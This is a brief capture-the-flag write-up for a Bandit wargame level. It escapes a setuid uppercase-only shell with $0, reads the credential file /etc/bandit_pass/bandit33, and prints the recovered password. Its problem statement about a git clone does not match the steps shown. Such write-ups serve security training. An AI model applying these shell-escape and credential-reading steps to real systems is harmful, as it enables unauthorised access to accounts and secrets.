# Bandit Level 33  Session Summary

## Problem
Interact with the uppercase shell and perform a git clone attempt from the Bandit32 git endpoint.

## Commands run and outcomes

1. SSH into bandit32, the uppercase shell starts and forces all input to uppercase.
 the major issue in this level is uppercase shell to escape from this shell
 type $0 or $0 $ and press enter
 example screen show
 ```
 WELCOME TO THE UPPERCASE SHELL
>> $0
$ 
```
```
2. Listed home directory
```
ls -la
# showed uppershell owned by bandit33 with setuid bit
-rwsr-x---   1 bandit33 bandit32 15140 Aug 15 13:16 uppershell
```

3. Created temporary working directory and changed into it
```
mktemp -d
cd /tmp/tmp.ISeGIsOWjj
```
4. Verified current user and read password file for bandit33
```
whoami
cat /etc/bandit_pass/bandit33
# password: tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
```

## Result
Password for bandit33 obtained: tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
